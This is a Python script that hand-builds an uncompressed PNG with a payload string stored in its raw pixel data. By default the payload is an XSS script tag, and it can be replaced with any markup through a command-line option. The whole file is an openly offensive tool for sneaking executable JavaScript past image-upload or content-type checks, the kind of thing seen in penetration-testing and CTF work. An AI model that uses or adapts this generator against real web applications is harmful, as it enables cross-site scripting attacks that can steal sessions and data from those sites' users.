#!/usr/bin/python3

import sys
import argparse
import zlib


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-x', '--width',  type=int, default=64)
    parser.add_argument('-y', '--height', type=int, default=64)
    parser.add_argument('-s', '--script', type=str.encode,
                        default="<script>alert('XSS from png')</script>")
    return parser.parse_args()


def crc(x):
    return zlib.crc32(x).to_bytes(4, byteorder='big')


def chunk(name, data):
    x = name + data
    return len(data).to_bytes(4, byteorder='big') + x + crc(x)


def idat():
    # Pad script to desired dimensions
    data = args.script.ljust(args.width * args.height * 3, b'\0')
    # Filtering phase (using filter 0 which does nothing)
    filtered = b''
    for i in range(0, 3*args.width*args.height, 3*args.width):
        filtered += (0).to_bytes(1, byteorder='big') + data[i:i+3*args.width]
    # Compression phase (no compresion)
    compressed = zlib.compress(filtered, level=0)
    return compressed


args = parse_args()

# PNG file signature
png = b'\x89PNG\x0d\x0a\x1a\x0a'

# IHDR
ihdr = args.width.to_bytes(4, byteorder='big')
ihdr += args.height.to_bytes(4, byteorder='big')
ihdr += (8).to_bytes(1, byteorder='big')     # bit depth
ihdr += (2).to_bytes(1, byteorder='big')     # color type: RGB
ihdr += (0).to_bytes(1, byteorder='big')     # compression method
ihdr += (0).to_bytes(1, byteorder='big')     # filter method
ihdr += (0).to_bytes(1, byteorder='big')     # interlace method: no interlace
png += chunk(b'IHDR', ihdr)

# IDAT
idat = idat()
png += chunk(b'IDAT', idat)

# IEND
png += chunk(b'IEND', b'')

sys.stdout.buffer.write(png)
